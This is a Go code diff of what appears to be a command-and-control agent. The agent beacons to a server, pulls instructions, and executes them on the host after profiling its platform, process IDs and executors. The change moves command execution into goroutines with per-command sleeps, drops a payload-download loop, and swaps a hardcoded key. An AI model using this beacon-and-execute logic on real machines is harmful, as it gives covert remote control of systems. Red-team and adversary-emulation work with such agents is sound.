@@ -10,15 +10,11 @@ import (
 	"reflect"
 	"runtime"
 	"strconv"
-	"strings"
-	"time"
 
 	"./api"
 	"./execute"
 	"./util"
 )
-
-var iteration = 60
 
 func askForInstructions(profile map[string]interface{}) {
 	beacon := api.Instructions(profile)
@@ -29,18 +25,12 @@ func askForInstructions(profile map[string]interface{}) {
 		cmds := reflect.ValueOf(beacon["instructions"])
 		for i := 0; i < cmds.Len(); i++ {
 			cmd := cmds.Index(i).Elem().String()
-			fmt.Println("[*] Running instruction")
 			command := util.Unpack([]byte(cmd))
-			payloads := strings.Split(strings.Replace(command["payload"].(string), " ", "", -1), ",")
-			for _, payload := range payloads {
-				if len(payload) > 0 {
-					api.Drop(profile["server"].(string), payload)
-				}
-			}
-			api.Execute(profile, command)
+			go api.ExecuteInstruction(command, profile)
+			util.Sleep(command["sleep"].(float64))
 		}
 	} else {
-		time.Sleep(time.Duration(profile["sleep"].(int)) * time.Second)
+		util.Sleep(float64(profile["sleep"].(int)))
 	}
 }
 
@@ -55,7 +45,7 @@ func buildProfile(server string, group string, executors []string) map[string]in
 	profile["architecture"] = runtime.GOARCH
 	profile["platform"] = runtime.GOOS
 	profile["location"] = os.Args[0]
-	profile["sleep"] = iteration
+	profile["sleep"] = 60
 	profile["pid"] = strconv.Itoa(os.Getpid())
 	profile["ppid"] = strconv.Itoa(os.Getppid())
 	profile["executors"] = execute.DetermineExecutor(executors, runtime.GOOS, runtime.GOARCH)
@@ -75,4 +65,4 @@ func main() {
 	}
 }
 
-var key = "IQD1Z334GD1CQMTH3Z82X7QF7OS105"
+var key = "RQVPHM7XGP5XPA17R5CWESBB5WRFNG"
